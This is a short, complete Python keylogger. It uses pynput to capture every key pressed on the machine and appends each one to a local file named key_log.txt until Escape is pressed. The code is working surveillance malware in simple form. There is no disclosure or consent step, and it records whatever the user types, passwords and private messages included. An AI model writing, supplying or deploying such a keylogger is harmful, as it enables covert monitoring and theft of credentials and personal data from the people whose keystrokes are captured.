from pynput.keyboard import Key, Listener

# File to log keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        # Write the pressed key to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    # Stop the keylogger on pressing the escape key
    if key == Key.esc:
        return False

# Start listening to keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

